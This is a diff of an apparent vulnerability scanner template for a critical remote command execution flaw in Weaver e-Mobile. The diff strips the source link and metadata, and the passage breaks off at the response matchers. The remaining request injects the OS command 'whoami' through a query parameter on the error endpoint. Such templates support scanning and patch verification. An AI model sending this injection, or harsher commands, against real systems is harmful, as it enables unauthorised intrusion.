@@ -3,18 +3,13 @@ info:
   name: 泛微e-Mobile 移动管理平台error存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tq9pguqpgfykcx5g'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tq9pguqpgfykcx5g
 http:
 - raw:
   - 'GET /client/common/error?a=whoami HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984823306-270b93f9-3a92-4102-8800-5d4066e7d471.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
